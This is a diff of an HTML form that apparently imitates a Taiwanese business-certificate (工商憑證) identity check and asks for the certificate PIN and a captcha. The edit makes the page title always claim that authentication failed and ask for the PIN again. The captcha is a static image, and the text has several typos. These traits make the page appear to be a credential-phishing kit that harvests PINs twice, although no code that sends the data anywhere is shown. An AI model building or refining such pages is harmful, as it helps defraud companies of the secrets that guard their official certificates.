@@ -23,8 +23,8 @@
             <!-- Company Verification Form -->
             <div class="form-container">
                 <div class="form-card">
-                    <h1 class="form-title">進行公司身分驗證</h1>
-                    <p class="form-subtitle">請將證卡傳送雙邊的電腦，如無工商憑證，請黏專人聯絡。</p>
+                    <h1 class="form-title">認證失敗，請確認pin碼，<br>並重新輸入後點選下一步。</h1>
+                    <p class="form-subtitle">請請將讀卡機連結您的電腦， 如無工商憑證，請點專人聯絡。</p>
 
                     <form class="application-form" id="companyVerificationForm">
 
@@ -50,13 +50,13 @@
                             <!-- 工商憑證 PIN 碼輸入 -->
                             <div class="form-group">
                                 <label for="businessPin">請輸入工商憑證PIN碼</label>
-                                <input type="password" data-err-flag="1" id="businessPin" name="businessPin" placeholder="商形驗證碼" required>
+                                <input type="password" data-err-flag="1" id="businessPin" name="businessPin" required>
                             </div>
                             <!-- 驗證碼區域 -->
                             <div class="form-group captcha-section">
                                 <div class="captcha-input">
                                     <label for="captcha">請輸入圖形驗證碼</label>
-                                    <input type="text" id="captcha" name="captcha" required>
+                                    <input type="text" data-err-flag="1" id="captcha" name="captcha" required>
                                     <img src="../assets/img/captcha.png" alt="驗證碼" class="captcha-image">
                                     <button type="button" class="captcha-refresh">換圖</button>
                                 </div>
